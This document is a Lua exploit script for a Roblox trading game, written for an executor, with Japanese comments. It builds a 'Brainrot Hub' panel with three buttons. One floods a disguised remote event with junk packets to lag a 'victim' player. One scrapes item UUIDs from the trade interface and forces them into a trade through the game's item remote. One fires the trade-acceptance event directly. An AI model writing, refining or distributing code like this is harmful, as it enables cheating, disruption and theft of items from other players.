-- [[ BRAINROT HUB FINAL VERSION ]]
-- 統合された偽装イベントとUUIDスキャナー

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer

-- 通信エンドポイントの定義
local DataRemote = RS.Packages.Net["RF/(I49:+jHDnjg/F29IKd7GJDz"] -- 本物のUUID送信
local SyncRemote = RS.Shared.Friends.FriendMain                 -- 承認用
local FakeRemote1 = game:GetService("CookiesService").FisherMan   -- 偽装パケット1
local FakeRemote2 = game:GetService("GamepadService").RobloxChatSystemMessage -- 偽装パケット2

-- UI作成 (ダーク＆ネオンピンク)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BrainrotHubFinal"
ScreenGui.Parent = game:GetService("CoreGui")

local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 250, 0, 320)
Main.Position = UDim2.new(0.5, -125, 0.5, -160)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = Main

local Stroke = Instance.new("UIStroke")
Stroke.Color = Color3.fromRGB(255, 0, 100)
Stroke.Thickness = 2
Stroke.Parent = Main

local Layout = Instance.new("UIListLayout")
Layout.Parent = Main
Layout.Padding = UDim.new(0, 8)
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "BRAINROT HUB V4"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.BackgroundTransparency = 1
Title.Parent = Main

-- ボタン生成用関数
local function CreateButton(name, color, func)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 45)
    btn.Text = name
    btn.BackgroundColor3 = color
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.GothamBold
    btn.Parent = Main
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 8)
    c.Parent = btn
    btn.MouseButton1Click:Connect(func)
end

-- 1. Freeze Victim (偽装パケット連打で相手の通信を混乱させる)
local freezing = false
CreateButton("Freeze Victim", Color3.fromRGB(0, 150, 255), function()
    freezing = not freezing
    print("Freeze Status: " .. tostring(freezing))
    task.spawn(function()
        while freezing do
            -- 偽装イベントを高速で叩いてラグを誘発
            FakeRemote1:FireServer("a\024RV\004\b\\\001\030\003\fS", "\b\006PY")
            task.wait(0.01)
        end
    end)
end)

-- 2. Force Give All Brainrot (UUID自動取得＆強制追加)
CreateButton("Force Give All", Color3.fromRGB(255, 0, 50), function()
    print("Executing Mass Inventory Scan...")
    
    -- トレードGUIの中からUUIDを持つオブジェクトを全検索
    for _, v in pairs(LP.PlayerGui:GetDescendants()) do
        if (v:IsA("StringValue") or v:IsA("TextLabel")) and (v.Name == "UUID" or v.Name == "ID" or v.Text:match("%w+-%w+-%w+-%w+-%w+")) then
            local targetUUID = v:IsA("StringValue") and v.Value or v.Text
            
            -- 本物のリモートに叩き込む
            task.spawn(function()
                local args = {
                    [1] = 1, -- 相手側スロット（状況に応じて2に変更）
                    [2] = {
                        UUID = targetUUID,
                        Index = "Fluriflura",
                        OfflineGain = 0,
                        LastCollect = os.time()
                    }
                }
                DataRemote:InvokeServer(unpack(args))
            end)
            print("Intercepted UUID: " .. targetUUID)
        end
    end
end)

-- 3. Force Accept (即時承認)
CreateButton("Force Accept", Color3.fromRGB(0, 255, 100), function()
    -- 承認イベントを直接発火
    SyncRemote:FireServer()
    -- 念のため前の偽装イベントも送っておく
    FakeRemote2:FireServer("oLW\005TSZ\006\031\001\nS", "\006YR\002")
    print("Trade finalized successfully.")
end)

print("Brainrot Hub Successfully Injected.")
